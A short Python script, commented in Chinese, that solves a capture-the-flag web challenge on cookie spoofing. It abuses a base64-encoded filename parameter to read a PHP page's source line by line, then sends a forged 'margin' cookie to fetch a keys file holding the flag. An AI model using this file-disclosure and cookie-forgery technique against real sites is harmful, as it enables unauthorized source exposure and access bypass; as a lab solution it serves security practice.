# cookies 欺骗
# http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=
import base64
import requests
# 解码url中的base64参数
print(base64.b64decode("a2V5cy50eHQ=").decode("utf-8"))
# 发现是文件名，于是构造index.php的base64参数
print(base64.b64encode(b'index.php'))
# 按行获取源码
line = 0
s = requests.session()
# 这里循环次数足够大就行
while line < 50:
    url = "http://123.206.87.240:8002/web11/index.php?line="+str(line)+"&filename="+base64.b64encode(b'index.php').decode("utf-8")
    print(s.get(url).text)
    line += 1
# 根据源码构造带cookie的访问
cookies = {'margin': 'margin'}
flag_url = "http://123.206.87.240:8002/web11/index.php?line=&filename="+base64.b64encode(b'keys.php').decode("utf-8")
print(s.get(flag_url, cookies=cookies).text)